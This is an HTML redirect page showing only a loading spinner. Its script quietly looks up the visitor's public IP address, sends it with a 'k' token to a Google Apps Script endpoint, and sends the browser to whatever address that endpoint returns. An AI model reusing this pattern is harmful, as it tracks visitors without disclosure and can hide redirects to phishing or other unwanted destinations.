<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title></title>
</head>
<body>
  <script>
    const AS_URL_BASE = "https://script.google.com/macros/s/AKfycbxcWtvIjRWDKh1cT_M3Hpx6m4-QPKj9LfQEwakmbLOxyL34VaxYF1xpVxG2gijo6Wd0/exec";
    
    const urlParams = new URLSearchParams(window.location.search);
    let k = urlParams.get('k'); // Extraemos el valor de k
    
    console.log("Valor de k:", k);
    
    if (k) {
      fetch("https://api.ipify.org?format=json")
        .then(response => response.json())
        .then(data => {
          const userIp = data.ip;
    
          fetch(`${AS_URL_BASE}?k=${k}&ip=${userIp}`)
            .then(r => r.text())
            .then((r) => {
              console.log(r);
              if (r) {
                document.location.replace(r);
              }
            })
            .catch(err => console.log(err));
        })
        .catch(err => console.log("Error obteniendo IP:", err));
    }

  </script>
  
  <div class="lds-ring"><div></div><div></div><div></div><div></div></div>
  
  
</body>
</html>
